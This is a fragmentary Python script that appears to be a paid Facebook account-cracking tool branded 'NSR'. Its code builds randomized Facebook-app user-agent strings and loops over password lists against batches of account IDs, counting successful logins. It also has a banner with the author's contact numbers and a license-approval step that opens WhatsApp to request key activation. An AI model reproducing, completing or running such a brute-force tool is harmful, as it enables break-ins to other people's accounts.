...
print('\n \033[1;32m[√]\033[1;96m Successfuly UPDATED')
print('Lets open...')
...
def uax():
         ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;]'
         return ua
...
logo = """\033[1;93m         
      ...
      |  \| | (___ | |__) |
      | . ` |\___ \|  _  /     \033[1;93m 
      | |\  |____) | | \ \   \033[1;90m𝐀𝐅𝐆\033[1;91m𝐇𝐀𝐍𝐈\033[1;92m𝐒𝐓𝐀𝐍
      |_| \_|_____/|_|  \_\
                 
                                  
 \033[1;97mNSR is On FIRE  🔥🔥🔥

\033[1;92m AFGHANISTAN     : FILE & RANDOM
\033[1;96m OTHER COUNTRIES : JUST FILE
 \033[1;92m----------------------------------------
 \033[1;92m[+] 𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √  𝐍𝐈𝐒𝐀𝐑 𝐀𝐇𝐌𝐀𝐃 ʋlƒat
 \033[1;92m[+] 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  +994406013941
 \033[1;92m[+] 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  𝐇𝐀𝐐𝐀𝐍𝐈 𝐓𝐄𝐀𝐌 𝐌𝐀𝐅𝐈𝐀  
 \033[1;92m[+] 𝗦𝗧𝗔𝗧𝗨𝗦      : \033[91;1m √  𝐏𝐚𝐢𝐝
 \033[1;92m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡     : \033[1;92m √  1.2  
 \033[1;92m----------------------------------------------"""
def line():
	print(f'\033[1;32m-----------------------------------------------------')
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mNSR\x1b[1;92m-\x1b[1;92mV-2\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("YOUR KEY : "+id)
      print('\33[1;37m----------------------------------------------')
      print("\33[1;96mNOTE: 1-week 100 afg  2-week 150 afg  1-Month 200 afg")  
      print("\33[1;37m----------------------------------------------")
      print("\33[1;37mTOOL IS PAID BUT YOU HAVE TO GET APPROVAL FIRST.")
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('\33[1;92mIF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Nisar👋%20Sir%20!%20Please%20Approve%20My%20key😒%20my%20key%20👇%20:%20'+id);os.system('am start https://wa.me/+4591937471?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
